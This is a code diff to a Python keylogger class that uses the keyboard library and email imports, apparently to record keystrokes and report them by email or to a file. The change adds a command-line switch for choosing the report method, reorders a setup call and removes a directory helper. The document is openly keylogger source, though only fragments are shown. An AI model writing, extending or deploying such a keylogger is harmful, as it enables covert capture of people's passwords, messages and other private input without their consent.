@@ -7,7 +7,7 @@ from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from threading import Timer
-
+import sys
 import keyboard
 
 from env_utils import setup_env
@@ -102,18 +102,19 @@ class Keylogger:
         keyboard.wait()
 
     def __init__(self, report_method="email"):
-        setup_env(self)
         self.report_method = report_method
+        setup_env(self)
         self.log = ""
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
         self.files = []
 
-    def mkdir(self, folder):
-        if not os.path.exists(folder):
-            os.makedirs(folder)
-
-
+  
 if __name__ == "__main__":
-    keylogger = Keylogger(report_method="file")
+    if len(sys.argv) < 2:
+        report_method = "file"
+    else:
+        report_method = sys.argv[1]
+    print("report_method = {}".format(report_method))
+    keylogger = Keylogger(report_method)
     keylogger.start()
